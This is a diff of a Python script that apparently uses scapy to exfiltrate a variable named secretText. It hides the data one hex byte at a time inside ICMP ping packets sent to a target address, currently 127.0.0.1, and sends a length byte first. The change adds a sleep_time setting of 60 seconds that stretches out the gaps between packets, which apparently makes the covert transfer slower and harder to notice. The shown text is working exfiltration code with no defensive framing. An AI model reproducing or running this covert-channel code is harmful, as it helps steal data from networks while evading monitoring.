@@ -27,6 +27,7 @@ def build_ping_packet(dst_ip, identifier, sequence_number, byte):
 if __name__ == "__main__":
     # Target IP address
     target = "127.0.0.1"
+    sleep_time = 60 #change time between packets
 
     # Example ID and Sequence
     icmp_id = 3417
@@ -42,7 +43,7 @@ if __name__ == "__main__":
             print(f"Received response for icmp_seq {icmp_seq} from {response.src} - pattern bytes")
         else:
             print("No response received (timeout)")
-        time.sleep(1) #change to adjust transfer speed
+        time.sleep(sleep_time)
 
     pkt = build_ping_packet(target, icmp_id, icmp_seq, f"{len(secretText):02x}")
     response = sr1(pkt, timeout = 2, verbose = 0)
@@ -50,14 +51,14 @@ if __name__ == "__main__":
         print(f"Received response for icmp_seq {icmp_seq} from {response.src} - length byte = {len(secretText):02x}")
     else:
         print("No response received (timeout)")
-    time.sleep(1) #change to adjust transfer speed
+    time.sleep(sleep_time)
     
     response = sr1(pkt, timeout = 2, verbose = 0)
     if response:
         print(f"Received response for icmp_seq {icmp_seq} from {response.src} - length byte = {len(secretText):02x}")
     else:
         print("No response received (timeout)")
-    time.sleep(1) #change to adjust transfer speed
+    time.sleep(sleep_time)
 
     for i in range(0, len(secretText_hex) - 1, 2):
         byte = secretText_hex[i:i+2] 
@@ -70,4 +71,4 @@ if __name__ == "__main__":
             print(f"Received response for icmp_seq {icmp_seq} from {response.src}")
         else:
             print("No response received (timeout)")
-        time.sleep(1) #change to adjust transfer speed
+        time.sleep(sleep_time) 
